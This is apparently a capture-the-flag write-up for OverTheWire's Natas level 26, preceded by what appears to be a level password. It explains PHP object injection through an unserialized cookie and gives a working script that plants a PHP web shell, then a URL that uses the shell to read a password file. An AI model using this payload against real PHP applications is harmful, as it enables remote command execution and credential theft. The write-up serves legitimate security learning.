```
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```
# Solution
This is a PHP object injection problem.

Reading the code from the source, we can see that this page deserialize the cookie values without sanitation.
```
$drawing = unserialize(base64_decode($_COOKIE["drawing"]));
```

Note: the drawing cookie only exists after user pressed "Draw".

After we have a normal cookie value, we can consider exploitation
### Exploitation
```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __destruct(){
        // write exit message
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $this->exitMsg);
        fclose($fd);
    }
}
```

This is class is specifically useful as it destructs itself. While doing so, it opens a file and write something into that file. We can leverage this class to create an object that has a shell file, then base64 encode it. So that it is decoded later.

```php
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    public function __construct() {
        $this->logFile = "/var/www/natas/natas26/img/shell.php";
        $this->initMsg = "";
        $this->exitMsg = "<?php system(\$_GET['cmd']); ?>";
    }
}

// Create object and encode
$payload = base64_encode(serialize(new Logger));

echo "Use this as your 'drawing' cookie:\n";
echo $payload . "\n";

?>
```

We simply need to visit the file:
```
http://natas26.natas.labs.overthewire.org/img/shell.php?cmd=cat /etc/natas_webpass/natas27
```